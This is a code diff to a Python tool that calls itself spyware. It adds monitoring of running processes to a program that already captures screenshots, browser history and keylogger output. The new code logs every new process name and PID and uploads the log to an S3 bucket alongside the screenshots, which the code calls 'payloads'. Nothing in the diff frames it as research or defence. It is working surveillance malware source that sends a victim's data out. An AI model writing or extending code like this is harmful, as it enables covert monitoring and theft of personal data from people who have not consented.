@@ -9,6 +9,8 @@ from browserhistory import get_browserhistory
 from browserhistory import browse
 import json
 from sys import platform
+import psutil
+
 def inputBrowser():
 	if platform == "linux" or platform == "darwin" or platform =="linux2":
 		os.system('killall -KILL firefox')
@@ -56,14 +58,34 @@ def main(args):
         os.remove(output_dir + '/history.txt')
         file.close()
 
+
+    processes_seen = []
+    fcreate = open(output_dir + "/outputs/processes.txt", "w")
+    fcreate.close()
     while cur_date <= end_date:
         im = screenshot.grab()
         file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.png'
         fp = output_dir + '/outputs/screenshots' + '/' + file_name
+        f = open(output_dir + "/outputs/processes.txt", "a")
+
+        changed = False
+        for process in psutil.process_iter():
+            processInfo = process.as_dict(attrs= ['pid', 'name', 'create_time'])
+            processID = processInfo['pid']
+            processName = processInfo['name']
+            if processName not in processes_seen:
+                processCreationTime = time.strftime('%d-%m-%Y %H:%M:%S', time.localtime(processInfo['create_time']))
+                f.write(f'{processCreationTime}: process_name: {processName} pid: {processID}\n')
+                processes_seen.append(processName)
+                changed=True
+            
+
         #save payloads to s3
         if s3_bucket != "":
             utils.save_to_s3(fp, file_name)
             os.remove(fp)
+            if changed:
+                utils.save_to_s3(output_dir + "/outputs/processes.txt", "processes")
 
         else: #save all payloads (keylogger, history, output files) to output dir
             im.save(fp)
@@ -71,7 +93,9 @@ def main(args):
         time.sleep(int(interval))
 
         cur_date += delta
-
+        
+    if s3!="":
+        os.remove(output_dir + "/outputs/processes.txt")
 # Instruction panel
 def inspanel():
     print("Enter 1 to run the program")
